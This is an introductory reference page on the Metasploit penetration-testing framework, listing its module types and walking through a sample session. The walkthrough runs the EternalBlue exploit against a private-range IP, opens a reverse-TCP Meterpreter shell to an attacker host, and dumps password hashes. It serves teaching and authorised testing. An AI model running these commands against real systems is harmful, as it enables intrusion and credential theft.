Metasploit Framework

Penetration Testing & Exploit Development Framework

Metasploit Framework is an open-source platform for developing, testing, and executing exploits. Created in 2003 by H.D. Moore and now maintained by Rapid7, it’s the most widely used tool for penetration testing and vulnerability validation. Security teams use it to safely verify if systems are actually exploitable, not just theoretically vulnerable.

Core Components

- Exploits: Code that takes advantage of a vulnerability: EternalBlue, Shellshock, etc.
- Payloads: Code executed after exploit succeeds: reverse shells, Meterpreter, add user
- Auxiliary: Scanners, fuzzers, DoS modules that don’t give you a shell
- Encoders: Obfuscate payloads to bypass AV/IDS signatures
- Post: Modules for privilege escalation, credential dumping, lateral movement after access
- NOPs: No-operation sleds for buffer overflow exploit stability

Basic Workflow Example

1. Scan and select exploit:

msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.5
msf6 exploit(ms17_010_eternalblue) > exploit

This targets the EternalBlue SMB vulnerability. If successful, you get a Meterpreter session on the target.

2. Post-exploitation with Meterpreter:

meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > screenshot
